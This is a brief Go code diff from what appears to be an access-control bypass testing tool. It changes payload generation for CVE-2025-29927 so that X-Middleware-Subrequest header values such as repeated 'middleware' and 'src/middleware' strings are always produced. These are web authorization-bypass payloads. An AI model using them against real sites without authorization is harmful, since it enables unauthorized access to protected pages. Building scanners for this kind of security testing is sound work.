@@ -29,7 +29,6 @@ For each header name, it creates multiple payload variations:
   - Header Value: Full URL constructed with parent path + original query string (if header name suggests URL context and query exists).
 
 3.  **Special CVE-2025-29927 Handling**
-  - For X-Middleware-Subrequest header:
   - Special values like "middleware", "middleware:middleware", etc. up to 6-7 repetitions
   - Also variations with "src/middleware", "src/middleware:src/middleware", etc.
 
@@ -77,13 +76,10 @@ func (pg *PayloadGenerator) GenerateHeadersURLPayloads(targetURL string, bypassM
 		BypassModule: bypassModule,
 	}
 
-	for _, headerURL := range headerURLs {
-		// Special handling for CVE-2025-29927 middleware subrequest
-		if strings.EqualFold(headerURL, "x-middleware-subrequest") {
-			allJobs = append(allJobs, generateMiddlewareSubrequestPayloads(baseJob, fullPathWithQuery)...)
-			continue // Skip standard handling for this header
-		}
+	// Add special middleware subrequest payloads for CVE-2025-29927
+	allJobs = append(allJobs, generateMiddlewareSubrequestPayloads(baseJob, fullPathWithQuery)...)
 
+	for _, headerURL := range headerURLs {
 		// First variant: base_path in header (don't add query to header)
 		job := baseJob
 		job.RawURI = "/"
